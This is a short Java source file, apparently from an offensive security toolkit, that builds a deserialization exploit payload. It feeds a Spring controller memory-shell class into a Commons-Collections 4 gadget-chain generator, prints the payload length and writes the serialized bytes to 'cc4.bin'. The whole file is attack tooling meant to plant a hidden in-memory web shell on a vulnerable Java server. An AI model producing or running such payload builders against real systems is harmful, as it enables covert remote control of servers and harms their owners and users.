package com.example.utils;

import com.example.memshell.SpringControllerMemShell;
import org.ppp.tools.ser.CC4Generator;

/**
 * @author Whoopsunix
 */
public class PayloadMake {
    public static void main(String[] args) throws Exception{
        CC4Generator cc4Generator = new CC4Generator();
        String payload = cc4Generator.make(SpringControllerMemShell.class);
        System.out.println(payload.length());
        cc4Generator.makeFile(SpringControllerMemShell.class, "cc4.bin");
    }
}
